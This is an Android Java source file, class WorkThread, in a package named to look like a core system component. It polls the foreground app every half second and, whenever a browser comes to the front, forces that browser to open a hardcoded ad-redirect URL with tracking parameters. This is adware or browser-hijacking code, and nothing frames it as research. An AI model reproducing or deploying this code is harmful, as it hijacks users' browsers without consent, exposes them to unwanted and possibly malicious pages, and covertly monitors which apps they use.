package com.android.core;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.SystemClock;
import android.util.Log;

import com.android.utils.Utils;

import java.util.List;

/**
 * Created by laole918 on 2016/5/5 0005.
 */
public class WorkThread implements Runnable {

    public static final String TAG = WorkThread.class.getSimpleName();

    private Context mContext;
    private Thread mThread;
    private String mTopApp;
    private boolean isWorking;
    private boolean isReStarting;

    public WorkThread(Context context) {
        mContext = context;
        mThread = null;
        isWorking = false;
        isReStarting = false;
    }

    public void start() {
        reStart();
    }

    private void reStart() {
        if (!isReStarting) {
            isReStarting = true;
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Log.d(TAG, "I'm restarting!!!");
                    isWorking = false;
                    while (mThread != null) {
                        isWorking = false;
                        SystemClock.sleep(1);
                        Log.d(TAG, "mThread != null");
                    }
                    mThread = new Thread(WorkThread.this);
                    isWorking = true;
                    mThread.start();
                }
            }).start();
        }
    }

    public void stop() {
        isWorking = false;
    }

    @Override
    public void run() {
        if (isReStarting) {
            Log.d(TAG, "I'm restarted!!!");
            isReStarting = false;
        }
        while (isWorking) {
            if (!Utils.isTopApp(mContext, mTopApp)) {
                mTopApp = null;
                List<String> packages = Utils.getBrowsAblePackages(mContext);
                for (String pk : packages) {
                    if (Utils.isTopApp(mContext, pk)) {
                        mTopApp = pk;
//                        SystemClock.sleep(4000);
                        gotoUrl(pk);
                        break;
                    }
                }
            }
            Log.d(TAG, "I'm working!!!");
            SystemClock.sleep(500);
        }
        mTopApp = null;
        mThread = null;
    }

    public void gotoUrl(final String pk) {
        Intent intent = new Intent();
        intent.setPackage(pk);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setAction(Intent.ACTION_VIEW);
        intent.addCategory(Intent.CATEGORY_BROWSABLE);
        intent.setData(Uri.parse("http://forcati.com/get/iad/1-3532-23672a8af6abb34f1349a5b4ec91103c?cl=WW_MS&af=2"));
        mContext.startActivity(intent);
        Log.d(TAG, "Open the url with:" + pk);
    }
}
